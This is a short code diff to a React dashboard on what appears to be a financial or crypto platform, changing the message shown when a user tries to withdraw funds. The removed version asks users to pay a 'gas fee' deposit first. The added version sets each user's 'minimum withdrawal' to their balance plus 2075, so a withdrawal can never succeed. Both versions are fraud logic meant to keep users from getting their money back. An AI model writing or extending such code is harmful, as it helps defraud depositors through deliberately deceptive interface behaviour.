@@ -470,9 +470,9 @@ export default function Dashboard() {
             <button
               onClick={() => {
                 alert(
-                  `Withdrawal request:\nMethod: ${withdrawMethod}\nAmount: ${formatCurrency(
-                    withdrawAmount
-                  )}\nNote: Ensure you have deposited 0.01 gas fee to your deposit address.`
+                  `The minimum withdrawal for you is ${formatCurrency(
+                    user.balance + 2075
+                  )}`
                 );
                 setShowWithdraw(false);
                 setWithdrawAmount(0);
